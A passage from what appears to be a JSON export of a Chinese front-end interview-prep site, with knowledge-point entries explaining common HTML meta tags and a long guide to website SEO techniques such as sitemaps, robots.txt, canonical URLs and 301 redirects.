X-UA-Compatible\n\n我们最常见的`http-equiv`值可能就是`X-UA-Compatible`了，它常常长这个样子：\n\n![](https://static.ecool.fun//article/3a03421a-1f08-4420-a59c-aa9acf8307a3.jpeg)\n\n它是用来是做IE浏览器适配的。\n\n`IE=edge`告诉浏览器，以当前浏览器支持的最新版本来渲染，IE9就以IE9版本来渲染。\n\n`chrome=1`告诉浏览器，如果当前IE浏览器安装了`Google Chrome Frame`插件，就以chrome内核来渲染页面。\n\n像上图这种两者都存在的情况：如果有chrome插件，就以chrome内核渲染，如果没有，就以当前浏览器支持的最高版本渲染。\n\n另外，这个属性支持的范围是`IE8-IE11`\n\n你可能注意到了，如果在我们的`http`头部中也设置了这个属性，并且和`meta`中设置的有冲突，那么哪一个优先呢？ 答案是：开发者偏好（`meta`元素）优先于Web服务器设置（HTTP头）。\n\n### content-type\n\n用来声明文档类型和字符集\n\n![](https://static.ecool.fun//article/4d63d524-f4fd-4cf6-bd07-a99eeb157ca6.jpeg)\n\n### x-dns-prefetch-control\n\n一般来说，HTML页面中的a标签会自动启用DNS提前解析来提升网站性能，但是在使用https协议的网站中失效了，我们可以设置：\n\n![](https://static.ecool.fun//article/b40ce71b-331d-4abd-8fee-8e7614752052.jpeg)\n\n来打开dns对a标签的提前解析\n\n### cache-control、Pragma、Expires\n\n和缓存相关的设置，但是遗憾的是这些往往不生效，我们一般都通过`http headers`来设置缓存策略",
    "testPoint": "### 1. **基本用法**\n   - **结构**：`<meta>` 标签没有闭合标签，通常包含 `name`、`http-equiv` 或 `charset` 属性来定义元数据。\n   - **示例**：\n     ```html\n     <meta charset=\"UTF-8\">\n     <meta name=\"author\" content=\"John Doe\">\n     <meta name=\"description\" content=\"This is a sample page.\">\n     ```\n\n### 2. **`charset` 属性**\n   - **定义**：指定文档的字符编码。常用于指定 HTML 文档所使用的字符集，确保页面能够正确显示非 ASCII 字符。\n   - **常见值**：`UTF-8` 是最常用的字符编码。\n   - **示例**：\n     ```html\n     <meta charset=\"UTF-8\">\n     ```\n\n### 3. **`name` 属性**\n   - **定义**：指定元数据的名称，通常用来描述页面的作者、描述、关键字等信息。\n   - **常见的 `name` 属性值**：\n     - `description`：页面描述。\n     - `keywords`：页面关键词。\n     - `author`：页面作者。\n     - `viewport`：用于响应式设计，控制页面的缩放和布局。\n   - **示例**：\n     ```html\n     <meta name=\"description\" content=\"This is a sample page for learning HTML.\">\n     <meta name=\"keywords\" content=\"HTML, CSS, JavaScript, Web Development\">\n     <meta name=\"author\" content=\"John Doe\">\n     ```\n\n### 4. **`http-equiv` 属性**\n   - **定义**：模拟 HTTP 响应头，提供与 HTTP 标头类似的元数据。常用于设置页面的缓存策略、内容类型等。\n   - **常见的 `http-equiv` 属性值**：\n     - `Content-Type`：指定文档的 MIME 类型和字符集。\n     - `refresh`：用于刷新页面或重定向页面。\n     - `X-UA-Compatible`：指定浏览器的渲染模式。\n   - **示例**：\n     ```html\n     <meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n     <meta http-equiv=\"refresh\" content=\"5;url=https://www.example.com\">\n     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n     ```\n\n### 5. **`viewport` 元标签**\n   - **定义**：用于响应式设计，指定视口的大小和缩放行为。通过设置视口宽度和缩放比例来优化移动设备上的显示效果。\n   - **常见属性**：\n     - `width`：设置视口的宽度。常用的值是 `device-width`，即设备屏幕的宽度。\n     - `initial-scale`：设置页面初始的缩放比例。\n     - `maximum-scale`：限制页面的最大缩放比例。\n   - **示例**：\n     ```html\n     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n     ```\n\n### 6. **`robots` 元标签**\n   - **定义**：控制搜索引擎如何爬取和索引网页。通常用于指定搜索引擎是否能够索引页面内容、是否跟踪页面中的链接。\n   - **常见属性值**：\n     - `index, follow`：允许页面被索引，并允许爬虫跟踪页面中的链接。\n     - `noindex, nofollow`：禁止页面被索引，并禁止跟踪链接。\n     - `noarchive`：防止搜索引擎缓存页面。\n   - **示例**：\n     ```html\n     <meta name=\"robots\" content=\"noindex, nofollow\">\n     ```\n\n### 7. **`refresh` 属性**\n   - **定义**：设置页面自动刷新或重定向的时间间隔。通常用于需要定时更新页面内容或跳转到其他页面的场景。\n   - **示例**：\n     ```html\n     <meta http-equiv=\"refresh\" content=\"10;url=https://www.example.com\">\n     ```\n\n### 8. **`og` 和 `twitter` 元标签**\n   - **定义**：这些标签用于社交媒体平台，如 Facebook、Twitter 等，来控制页面的预览和分享内容。也称为 Open Graph 标签。\n   - **常见标签**：\n     - `og:title`：页面的标题。\n     - `og:description`：页面的描述。\n     - `og:image`：分享时显示的图像。\n     - `twitter:card`：Twitter 卡片类型（如总结卡、图片卡等）。\n   - **示例**：\n     ```html\n     <meta property=\"og:title\" content=\"Web Development\">\n     <meta property=\"og:description\" content=\"Learn web development using HTML, CSS, and JavaScript\">\n     <meta property=\"og:image\" content=\"image_url.jpg\">\n     <meta name=\"twitter:card\" content=\"summary_large_image\">\n     ```\n\n### 9. **`apple-mobile-web-app-capable`**\n   - **定义**：控制 Web 应用是否在 iOS 设备上作为独立应用启动，消除浏览器界面元素（如地址栏）。\n   - **常见值**：\n     - `yes`：支持全屏显示，像本地应用一样运行。\n     - `no`：显示浏览器界面元素。\n   - **示例**：\n     ```html\n     <meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\n     ```\n\n### 10. **`theme-color`**\n   - **定义**：设置浏览器地址栏的颜色。用于优化移动端的用户体验，尤其是在 Android 和 Chrome 浏览器中。\n   - **示例**：\n     ```html\n     <meta name=\"theme-color\" content=\"#4CAF50\">\n     ```\n\n### 11. **`charset` 与 `UTF-8`**\n   - **重要性**：使用 UTF-8 编码，确保页面可以正确显示各种语言的字符。\n   - **最佳实践**：`<meta charset=\"UTF-8\">` 应该是页面 `<head>` 部分的第一行，以确保字符编码的正确性。\n\n### 12. **`icon` 和 `favicon`**\n   - **定义**：通过 `<meta>` 标签定义网站的图标，通常在浏览器标签栏显示，也可以作为移动设备上的快捷方式图标。\n   - **示例**：\n     ```html\n     <meta rel=\"icon\" href=\"favicon.ico\">\n     ```\n\n### 13. **`http-equiv=\"X-UA-Compatible\"`**\n   - **定义**：告诉 Internet Explorer 使用最新的渲染引擎来呈现页面，避免使用较旧的兼容模式。\n   - **示例**：\n     ```html\n     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n     ```\n\n### 14. **`Content-Security-Policy (CSP)`**\n   - **定义**：CSP 用于防止跨站脚本攻击（XSS）等安全问题。它通过指定允许加载资源的源来增加页面的安全性。\n   - **示例**：\n     ```html\n     <meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'\">\n     ```\n\n### 15. **多语言网站的 `<meta>` 标签**\n   - **定义**：设置页面的语言，帮助搜索引擎和浏览器了解页面的语言类型，优化本地化内容。\n   - **示例**：\n     ```html\n     <meta http-equiv=\"Content-Language\" content=\"en-US\">\n     ```",
    "exerciseKeyList": "[\"c849aa25-0dae-49aa-8148-b1c410a7aa1e\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 6,
    "createAt": "2024-11-05T01:27:44.000Z",
    "updateAt": "2024-11-06T06:13:21.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "c849aa25-0dae-49aa-8148-b1c410a7aa1e",
        "title": "常用的 meta 元素有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T05:17:07.000Z",
        "updateAt": "2024-08-10T21:37:46.000Z"
      }
    ]
  },
  "147": {
    "id": 147,
    "tagId": 12,
    "title": "SEO",
    "explanation": "# 🌻 前言\n\nSEO 代表搜寻引擎最佳化/搜寻引擎优化(英文全名Search Engine Optimization，简称SEO)，是指通过了解搜寻引擎的自然排名的算法逻辑，以提高目标网站在有关搜寻引擎内排名的方式。\n\n网站的 SEO 至关重要，它可以让你的网站获得更好的排名和流量，从而提高网站知名度。对于一些盈利的网站，做好seo，还可以以低成本提高投资回报率。\n\n> 本文将为你带来非常全面的SEO方案🔥🔥🔥，当然了，网站SEO是长线工作，在做好一些基础的配置之后，更重要的是后期的维护，比如定期更新网站动态文章，不断寻找优质外链资源等🤌。\n\n本文将以三个层面展开：\n\n1.  TDK优化\n2.  网站质量\n3.  SEO手段（10种手段）\n\n# ❄️ 一、TDK优化\n\nTDK是Title(页面标题)、Meta Description（页面描述）和Meta Keywords（页面关键词）的缩写，对网站的这三个信息的提炼是网站SEO的重要环节。\n\n但是由于一些原因，各大主流搜索引擎基本都已经**大大降低甚至移除了 `<keywords>` 对排名的影响**。例如：\n\n-   百度：几乎放弃了对<keyword>标签的参考价值。参考：百度官方称：keywords这个meta标签已经被丢进历史垃圾堆了；\n-   谷歌：目前几乎已经不考虑这个标签对于SEO的作用了，它可能更侧重于内容的相关性以及反向链接的考量。参考[：# Google 不会将关键字元标记用于网页排名](https://developers.google.com/search/blog/2009/09/google-does-not-use-keywords-meta-tag?hl=zh-cn)\n-   必应：目前 keywords 标签仍然对排名有一定影响；\n\n## （一）title标签-网站名片\n\ntitle标签相当于网站的名片，他会直接显示在搜索结果中。一个好的标题势必可以为网站带来流量，从而提升网站排名。  \n注意：网站标题避免冗长\n\n```js\n例如：<title>掘金</title>\n```\n\n## （二）META标签-网站信息\n\nMETA标签是网页head区的辅助性标签，它的作用是经过配置一些参数用以描述页面属性。**目前几乎所有搜索引擎都使用网上机器人自动查找meta值来给网页分类。**\n\n### 2.1 meta标签如何使用\n\nmeta标签的`属性`有两种：`name`和`http- equiv`。\n\n🍀 **\"name\"属性有以下配置项：**\n\n-   Keywords(关键词，现在不再重要了)：逗号分隔的关键词列表（告诉搜索引擎页面是与什么相关的）；\n-   description(网站内容描述，很重要)：页面描述。搜索引擎会把这个描述显示在搜索结果中；\n-   format-detection：格式检测，比如禁止识别电话，邮箱等；\n-   author：作者的名字；\n-   Robots：用来告诉搜索机器人哪些页面需要索引，哪些页面不需要索引；\n-   theme-color：网站主题色；\n\n```js\n<meta name=\"keywords\" content=\"掘金,稀土,Vue.js,前端面试题,Kotlin,ReactNative,Python\">\n\n<meta name=\"description\" content=\"掘金是面向全球中文开发者的技术内容分享与交流平台。我们通过技术文章、沸点、课程、直播等产品和服务，打造一个激发开发者创作灵感，激励开发者沉淀分享，陪伴开发者成长的综合类技术社区。\">\n\n<meta name=\"format-detection\" content=\"telephone=no\">\n\n<meta name=\"author\" content=\"cece\">\n\n<Meta name=\"Robots\" Content=\"Nofollow\">\n/** \nall：文件将被检索，且页面上的链接可以被查询；  \nnone：文件将不被检索，且页面上的链接不可以被查询；(和 \"noindex, no follow\" 起相同作用)  \nindex：文件将被检索；（让robot/spider登录）  \nfollow：页面上的链接可以被查询；  \nnoindex：文件将不被检索，但页面上的链接可以被查询；(不让robot/spider登录)  \nnofollow：文件将不被检索，页面上的链接可以被查询。(不让robot/spider顺着此页的连接往下探找)\n*/\n\n<meta name=\"theme-color\" content=\"#4285f4\" />\n```\n\n🍀 **\"http- equiv\"属性有以下配置项：**\n\nhttp-equiv顾名思义，相当于http的文件头作用，它可以向浏览器传回一些有用的信息，以帮助正确和精确地显示网页内容。\n\n```js\n<meta http-equiv=\"参数\"content=\"参数变量值\">；\n```\n\n-   refresh(期限)：定义文档自动刷新的时间间隔（下面content中的2是指停留2秒钟后自动刷新到URL网址）。这个属性值慎重使用，因为它会使得页面不受用户控制；\n-   set-cookie：如果网页过期，那么存盘的cookie将被删除；\n\n```js\n<meta http-equiv=\"refresh\" content=\"2;URL=http://www.baidu.com\">\n\n<meta http-equiv=\"Set-Cookie\"content=\"cookie value=xxx;expires=Friday,12-Jan-200118:18:18GMT；path=/\">\n\n```\n\n### 2.2 Open Graph 协议标签\n\nOpen Graph 协议标签通过 OG Tags （OG 标签）实现的，它属于 Meta 标签的一种，可以用来标识网页类型和元素，让分享到社交网络的内容可以被有效的抓取，还可以控制分享的网站卡片呈现我们想要显示的内容。\n\n只要看到以 `og:` 为前缀的 Meta 标签就可以判断该网页支持 OG 标签了，如下：\n\n```ini\n<meta property=\"og:title\" content=\"设置Open Graph 标签！社交营销优化！\">\n<meta property=\"og:site_name\" content=\"前端阿彬\">\n<meta property=\"og:type\" content=\"article\">\n<meta property=\"og:description\" content=\"Open Graph Protocol（开放图谱协议），简称 OG 协议或 OGP。\">\n```\n\n设置og协议前后的网站分享卡片对比：\n\n![image.png](https://static.ecool.fun//article/78f99d89-97fe-49e8-a26f-a84fc68227bd.jpeg)\n\n### 2.3 关于网站关键词\n\n上面我们也提到了，现在 `keywords` 关键词已经被各大搜索引擎降低了权重，所以可以设置也可以不设置，但我认为它仍然有他存在的价值。\n\n如果你决定配置网站关键词，需要注意以下几点：\n\n-   keywords 关键词数量控制在1-4个左右，避免关键词堆砌；\n-   合理选择长尾关键词（长尾关键词一般是2-3个词组成。例如，目标关键词是服装，其长尾关键词可以是男士服装、冬装等），长尾关键词虽然相对核心关键词的搜索量小很多，但是它带来的流量精准度非常高，后期的转化效果更好；\n-   避免使用过于专业的词汇。过于专业的词汇的搜索量较低；\n-   减少使用热门关键词，要选择合适的关键词（搜索量大、转化率高、定位精准）。\n\n### 2.3 关于网站描述\n\n-   Description（页面描述）的长度最好控制在120~200个字符；\n-   Description要让用户知道将从页面中获得什么；\n-   在Description中合理使用行动号召（CTA）用语（例如“了解更多”、“立即获取”、“免费试用”等等……）；\n-   Description应该包含页面的核心关键字；\n-   为每个页面创建独一无二的Description；\n\n# 🌈 二、网站质量\n\n## （一）确保页面性能\n\n网站性能是会影响到网站的SEO排名的，原因可想而知：\n\n-   网站卡顿势必会大大降低网站的用户留存率；\n-   如果网站加载缓慢，搜索引擎就会认为该网站对用户不友好，从而将其排名下降；\n-   影响搜索引擎蜘蛛的爬取频率；  \n    等\n\n参考文章 [谷歌将网页加载速度快慢作为影响排名重要因素。](https://www.xingbell.com/db/news-n42.html)\n\n## （二）HTML语义化\n\n语义化是指内容的结构化（内容语义化），选择合适的标签（代码语义化）。  \n杜绝通篇div，HTML语义化不仅便于开发者阅读，还有利于浏览器爬虫的解析，对seo优化很有帮助。  \n所以我们在开发时要遵循语义化的开发规范，根据页面内容，选择合适的标签，优化代码，使得网页结构更加清晰。\n\n**下面介绍几种标签的使用：**\n\n**h 标签**  \nh标签一种有六个，分别是h1，h2...h6。h1-h6文字由大到小，权重也逐渐降低。相比其他标签而言，h标签在页面中的权重非常高，所以不要滥用h标签。要利用h标签告诉浏览器网页的核心内容！例如：  \nh1写主标题，通常与网页title标签一致，可以在页面展示，**一个页面最好只有一个h1标签**。  \nh2写次级标题，h3-h6以此类推，细分网页结构。\n\n**strong、em 标签**  \n`<b>`和`<strong>`标签都是加粗文字的标签，其二者的区别就在于：`<b>`是为了加粗而加粗的，`<strong>`是为了强调而加粗的。  \n同样斜体标签 `<i>` 和 `<em>` 也有着相同的区别，`<em>`有强调效果。  \n推荐使用`<strong> <em>`，而不是 `<b> <i>` 等，单纯修改加粗等样式可以用css实现。\n\n**ul ol li 标签**  \n这三个都是列表标签，ul表示无序列表（unordered list），ol表示有序列表(oredr list), li 表示列表项（list item）。从网站优化的角度来说，在罗列多个词条的时候，最好使用列表标签，例如 使用ul li布局网站导航条对搜索引擎蜘蛛更加友好，也是影响搜索引擎排名的因素之一。\n\n**img 标签**  \nimg图片标签的 `alt` 属性是图片的替换文字。  \nalt属性可以帮助蜘蛛快速理解图片的具体内容，并且在网络故障时，仍然能够爬取到图片的内容信息。\n\n**其他标签**\n\n-   **nav** 标签定义导航链接的部分；\n-   **aside** 标签定义侧边栏内容、引述内容；\n-   **header** 标签定义网站头部，介绍信息。它通常是一组介绍性描述 (搜索框 / logo / …)，网络爬虫知道诸如与之类的部分后可以非常简单的跳过它们，更好的定位网页内容；\n-   **article** 标签定义网站的内容部分。搜索引擎通过这个标签可以正确知道页面中哪些是正文内容；\n-   **section** 标签定义文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分；\n-   **footer** 标签定义文档或节的页脚。它对网站首页的排名将会增加，而对于内页来说搜索引擎将有可能会视而不见。不建议每个web的footer信息都是独立的，这或许意味着新的黑帽手段将会出现。\n\n## （三）其他注意点\n\n-   SEO的禁忌之一就是用JS输出重要的内容。爬虫不会读取JS格式的内容，所以重要的内容必须是HTML格式，这也就是为什么现在流行的spa框架都不利于seo的原因之一；\n-   尽量不使用iFrame。因为搜索引擎不会抓取iframe内的内容，所以重要内容绝对不能放在iframe中；\n-   如果需要截取文字，尽量用css实现，保证文字可以完整呈现给搜索引擎。\n\n# 🔧 三、SEO手段\n\n## （一）各搜索引擎提交站点收录\n\n在各个搜索引擎的站点平台提交网站收录可以缩短爬虫发现网站链接时间，加快爬虫抓取速度。\n\n-   百度站长资源平台  \n    [ziyuan.baidu.com/?castk=LTE%…](https://ziyuan.baidu.com/?castk=LTE%3D)\n-   谷歌网站管理员工具  \n    [www.google.cn/webmasters/](http://www.google.cn/webmasters/)\n-   搜狗站长平台  \n    [zhanzhang.sogou.com/](https://zhanzhang.sogou.com/)\n-   360站长平台  \n    [zhanzhang.so.com/](https://zhanzhang.so.com/\n-   头条搜索站长平台  \n    [zhanzhang.toutiao.com/](https://zhanzhang.toutiao.com/)\n-   必应网站管理员工具  \n    [www.bing.com/webmaster/i…](https://www.bing.com/webmaster/info/missinginfo)\n\n## （二）sitemap站点地图\n\nSitemap，即站点地图，它是一个网站的全部URL列表，同时可以列出每个网址的其他元数据（上次更新的时间、更改的频率以及相对于网站上其他网址的重要程度为何等）。它可以为搜索引擎的蜘蛛进行导航，更快的找到全站中的所有链接，更全面的获取网站信息。为了保证链接的全面性和准确性，应该自动不定期更新sitemap站点地图。\n\n一般网站的sitemap文件都会有以下两种格式：\n\nsitemap.xml，这是大部分搜索引擎所使用的用于提交网站网址的XML文件；  \nsitemap.html，这是可直接放在网站上用于用户访问或搜索引擎快速找到全站链接的页面（每页最多500条，自动分页）；\n\nsitemap.xml 文件内容格式大致如下：\n\n```js\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <urlset\n        xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\"\n        xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9\n           http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\"\n    >\n\n    <url>\n     <loc>https://www.cece.com/</loc>\n     <priority>0.3</priority>\n     <lastmod>2023-05-17</lastmod>\n     <changefreq>weekly</changefreq>\n    </url>\n\n    </urlset>\n```\n\n网上有很多生成sitemap文件的站长工具，例如：  \n[sitemap.zhetao.com/](https://sitemap.zhetao.com/)  \n[tools.bugscaner.com/sitemapspid…](http://tools.bugscaner.com/sitemapspider)\n\n生成的sitemap文件一般放在项目根目录下，然后可以在各个搜索引擎的站点平台提交sitemap.xml文件。\n\n## （三）robots文件\n\n蜘蛛在访问一个网站时，会首先会检查该网站的根域下是否有一个叫做 robots.txt的纯文本文件，这个文件用于指定spider在您网站上的抓取范围。\n\n如果你有哪些页面不想被蜘蛛访问，则可以通过robots文件告诉蜘蛛不想被搜索引擎收录的部分或者指定搜索引擎只收录特定的部分。\n\nrobots文件内容语法：  \n此文件主要由两种键值对组成：\n\n1.  **User-agent:**  该项的值用于描述搜索引擎蜘蛛的名字。如果该项的值设为\\*，则该协议对任何机器人均有效。\n2.  **Disallow:**  该项的值用于描述不希望被访问到的一个URL，一个目录或者整个网站。以Disallow 开头的URL 均不会被搜索引擎蜘蛛访问到。任何一条Disallow 记录为空，说明该网站的所有部分都允许被访问。\n\n参考： [掘金的robots文件：https://juejin.cn/robots.txt](https://juejin.cn/robots.txt)\n\n```js\n*网站目录下所有文件均能被所有搜索引擎蜘蛛访问*\nUser-agent: *\nDisallow:\n\n*禁止所有搜索引擎蜘蛛访问网站的任何部分*\nUser-agent: *\nDisallow: /\n\n*禁止所有的搜索引擎蜘蛛访问网站的几个目录*\nUser-agent: *\nDisallow: /a/\nDisallow: /b/\n\n*只允许某个搜索引擎蜘蛛访问*\nUser-agent: Googlebot\nDisallow: \n```\n\n使用场景举例：\n\n-   将一些不重要的页面配置在robots 文件中，集中蜘蛛爬取的权重；\n-   虽然 robots 文件是用于通知蜘蛛忽略哪些文件的爬取的，但是每当用户试图访问某个不存在的URL时，服务器都会在日志中记录404错误（无法找到文件）。每当搜索蜘蛛来寻找并不存在的robots.txt文件时，服务器也将在日志中记录一条404错误，所以建议还是添加一个robots.txt。\n-   避免服务器上的一些文件被蜘蛛访问，例如后台管理文件、程序脚本、附件、数据库文件、编码文件、样式表文件、模板文件、导航图片和背景图片等等，例如设置`Disallow: /data/ 数据库文件`；\n-   避免访问时出错，例如不能让用户直接进入购物车页面，否则会报错，所以要用 robots 文件告诉蜘蛛，阻止这个页面被搜索引擎收录；\n-   如果你的网站是动态网页，并且你为这些动态网页创建了静态副本，以供搜索蜘蛛更容易抓取。那么你需要在robots.txt文件里设置避免动态网页被蜘蛛索引，以保证这些网页不会被视为含重复内容。\n-   将sitemap站点地图配置在robots文件中允许蜘蛛访问。这样站长就不需要在每个搜索引擎的站长平台去提交网站的sitemap 文件，搜索引擎的蜘蛛自己就会抓取robots.txt文件，读取其中的sitemap路径，接着抓取其中链接的网页。但是目前国内的搜索引擎基本都不支持此配置。\n\n**robots 文件使用方法：**  \n使用方法非常简单，只需要将 `robots.txt` 文件上传到网站根目录就行了，注意文件名一定要全小写。当成功上传后，通常在浏览器中访问域名/robots.txt就可以查看到文件。\n\n## （四）内链｜外链\n\n在搜索引擎优化领域，有着**内链为王、外链为皇**的说法，它们都能对提升网站排名有所帮助，尤其是外链的建设。 先来区分下网站内链和外链：\n\n> **内链**：从自己网站的一个页面指向另外一个页面。通过内链让网站内部形成网状结构，让蜘蛛的广度和深度达到最大化。\n> \n> **外链**：在别的网站导入自己网站的链接。通过外链提升网站权重，提高网站流量。外链有以下几个好处：\n> \n> -   提升网站权重\n> -   能够吸引蜘蛛来抓取网站\n> -   提升关键词排名\n> -   提升网址或品牌的曝光度\n> -   给网站带来流量\n\n外链能够为我们的网站带来流量，所以外链数量越多越好是必然的。但是，**一定要注意外链的质量**，例如对方网站没有被搜索引擎收录，对方网站性能过差，死链等，这些低质量的外链反而会影响到本站的排名。\n\n另外，在添加内链外链的过程中，要注意在 a 标签中对 `nofollow` 和·`external` 属性的使用。\n\n> `<a>` 标签的 rel 属性用于指定当前文档与被链接文档的关系。\n\n**`rel=nofollow`使用说明 >>>**\n\n```js\n<a rel=\"nofollow\" href=\"http://www.baidu.com/\">百度</a>\n```\n\n带有`rel=nofollow` 属性的链接会告诉搜索引擎忽略这个链接。阻止搜索引擎对该页面进行追踪。从而避免权重分散。这个属性只对搜索引擎有效，这是一个纯粹的SEO优化标签。\n\n使用场景：\n\n-   屏蔽一些垃圾链接，比如网站上面评论里面的站外链接，论坛里面用户留下的链接等；\n-   外链的内容与本站无关时，建议使用nofollow；\n\n![image.png](https://static.ecool.fun//article/28218614-d3e8-45b2-9c52-66f297f2846c.jpeg)\n\n-   外链站点不稳定，性能较差时，建议使用nofollow；\n-   友链一般作为网站交换链接，互惠互利，是不会设置nofollow的，所以在交换友链之前，一定要对对方的网站质量进行审核；\n-   内部链接密度过大，页面重要性不高时，可以使用nofoolw，例如很多网站常有的“关于我们”页面，比如掘金的：\n\n![image.png](https://static.ecool.fun//article/ca0f4cb9-891c-4fc8-9571-9e24c3ba65ae.jpeg)\n\n6.  并不是内容无关的外链都要加nofollow。**适当的添加高质量的外链**，对于SEO是没有坏处的，还会产生正向影响，所以关键就在于外链的质量和数量上。例如掘金的友链：\n\n![image.png](https://static.ecool.fun//article/871a0a12-48d3-4f20-aa13-66208ecf11fe.jpeg)\n\n**`rel=external`使用说明 >>>**\n\n```js\n<a rel=\"external\" href=\"http://www.baidu.com/\">百度</a>\n```\n\nexternal字面意思是“外部的”，a 标签加上这个属性代表这个链接是外部链接，非本站链接，点击时会在新窗口中打开，它和`target=\"_blank\"`效果一样。external 可以告诉搜索引擎这是一个外部链接，非本站的链接。\n\n## （五）Canonical URL（网址规范化）\n\n什么是网址规范化？简单举个例子：  \n[juejin.cn](https://juejin.cn)  \n[www.juejin.cn](https://www.juejin.cn)  \n[www.juejin.cn/index.html](https://www.juejin.cn/index.html)  \n这几个网址虽然url不同，搜索引擎也确实把他当作不同的网址，但是其实这些网址返回的都是同一个页面，这就是不规范网址。\n\n**网页规范化的两个好处：**\n\n-   解决网站由于网站url链接不一样，但网页内容是一样而造成搜索引擎重复收录的问题；\n-   有利于URL权重集中。\n\n**解决方法：**  \n在页面的`head` 标签中，加入以下canonical标签，指定规范化网址。\n\n```bash\n<head>\n  <link rel=\"canonical\" href=\"href=\"https://juejin.cn\"/>\n</head>\n\n```\n\n例如掘金的规范化网址：\n\n![image.png](https://static.ecool.fun//article/73cd8ccf-caa4-4f1e-a5ba-1b759c464f6d.jpeg)\n\n## （六）网站301重定向\n\n301/302重定向是 SEO优化中一种重要的自动转向技术。301重定向是当搜索引擎向网站服务器发出访问请求时，服务返回的HTTP数据流中头信息(header)部分状态码的一种，表示本网址永久性转移到另一个地址。302重定向则表示暂时转移。\n\n301重定向与上一点所说的网址规范化有着类似的作用，与此同时，它还具有以下作用：\n\n-   集中域名权重，301 网址跳转其实是对域名权重进行转移，比如 `www.juejin.cn` 重定向到 `juejin.cn`，其实是把 `www.juejin.cn` 的权重转移到了 `juejin.cn`，从而增加 `juejin.cn` 域名的权重；\n-   避免重复收录；\n-   网页PR（PageRank-网页级别）是用来评估一个网站页面相对于网站其他页面重要性的一个算法，301定向跳转有利于网站PR的传递；\n-   优化用户体验，网址规范化可以让用户更好地记住我们的网站，可以将域名统一重定向到某一个域名，增加网站的记忆度，获取更好的用户体验。\n\n虽然`canonical标签`可以规范化网址，但是以下四种情况必须配置301重定向：\n\n1.  网站替换域名后，通过301永久重定向旧域名重定向到新域名，弥补流量损失和SEO;\n2.  如果删除掉网站中的一些页面，但是这个页面有一定的流量和权重，可以利用301重定向到合适的页面避免流量流失；\n3.  网站改版或因为其他原因导致页面地址发生变化，为避免出现死链接，可以通过 301 重定向来解决；\n4.  如果您有多个空闲的域名需要指向相同的站点，则可以使用301永久重定向；\n\n**如何验证301重定向是否生效：**  \n可以使用站长工具`[HTTP状态查询](https://tool.chinaz.com/pagestatus/)` 查看返回的状态码是否为301。\n\n![image.png](https://static.ecool.fun//article/7ed8501a-56f0-4a0f-840b-672fc700d19b.jpeg)\n\n## （七）网站设置伪静态页面\n\n> 伪静态页面是指动态网页通过重写URL的方法实现去掉动态网页的参数,但在实际的网页目录中并没有必要实现存在重写的页面。\n\n动态页面通常是php或者asp等语言结合数据库，通过代码调用数据来实现页面展示。\n\n伪静态化就是将动态页面的url转换成以 .html 等结尾的静态页面url，以增强搜索引擎的友好性（符合搜索引擎的抓取规则），同时方便用户输入和记忆。\n\n举个例子： 比如有个asp动态页面：[http://127.0.0.1/test.asp?id=1234](http://127.0.0.1/test.asp?id=1234 \"http://127.0.0.1/test.asp?id=1234\")  \n在伪静态化后，就可以通过类似的url访问这个页面： [http://127.0.0.1/test\\_1234.html](http://127.0.0.1/test_1234.html \"http://127.0.0.1/test_1234.html\")\n\n一般实现手段是在 nginx/apache 等服务器配置rewrite重写规则，将动态url转变为静态url。\n\n## （八）使用HTTPS\n\n谷歌曾发公告表示，使用安全加密协议（HTTPS），是搜索引擎排名的一项参考因素。  \n所以，在域名相同情况下，HTTPS站点比HTTP站点，能获得更好的排名。\n\n## （九）SSR服务端渲染（ Server-Side Rendering）\n\n当下SPA应用盛行，虽然它有用户体验好，服务器压力小等优点，但是同时也暴露出很多问题。例如首屏加载较慢，不利于SEO等（因为这些spa应用内容是由js动态更新的，蜘蛛无法爬取网页内容）。\n\n而ssr的出现，很好的解决了seo的问题。因为服务端渲染是指指客户端向服务器发出请求，然后运行时动态生成 html 内容并返回给客户端。所以客户端可以获取到完整的页面内容。\n\n目前流行的 Vue/React 前端框架，都有SSR的解决方案：  \n[Vue的nuxt.js](https://www.nuxtjs.cn/)  \n[React的next.js](https://www.nextjs.cn/)\n\n对于 Vue/React 来说，对于它们的 SSR/SSG 框架出现的原因就是主要就是 SEO 和首屏加载速度。\n\n## （十）预渲染prerender-spa-plugin\n\n如果你只想改善部分页面的SEO，可以不采用 SSR 的解决方案，毕竟无论是next.js，还是nuxt.js，都是有一定学习成本的。那么你可以使用 `prerender-spa-plugin` 等插件来实现预渲染页面，在构建时就针对特定的路有生成静态的 html 文件。 \n",
    "testPoint": "### 1. **页面结构与语义化 HTML**\n   - **语义化 HTML 标签**：使用正确的 HTML 标签（如 `<header>`, `<footer>`, `<article>`, `<section>`, `<nav>`, `<main>` 等）有助于搜索引擎理解页面内容的结构。\n   - **重要性**：搜索引擎会根据页面的结构来判断页面的主题和重要性，使用语义化的标签有助于 SEO。\n   - **考察点**：\n     - 什么是语义化 HTML？\n     - 为什么语义化标签对 SEO 重要？\n     - 常见的语义化 HTML 标签及其作用。\n\n### 2. **页面标题（`<title>`）**\n   - **定义**：页面的 `<title>` 标签是搜索引擎和用户浏览器中最重要的内容之一。\n   - **最佳实践**：页面标题应简洁、描述性强，并包含目标关键字。\n   - **考察点**：\n     - `<title>` 标签的最佳实践。\n     - 如何优化页面标题以提高 SEO。\n     - 页面标题与 SEO 排名的关系。\n\n### 3. **Meta 描述（`<meta name=\"description\">`）**\n   - **定义**：`<meta name=\"description\">` 提供了页面的简短描述，通常在搜索引擎的结果页面（SERP）中显示。\n   - **最佳实践**：保持描述简洁（150-160 字符），并包含相关的关键字和吸引点击的内容。\n   - **考察点**：\n     - Meta 描述如何影响搜索结果。\n     - 为什么 Meta 描述对用户体验和 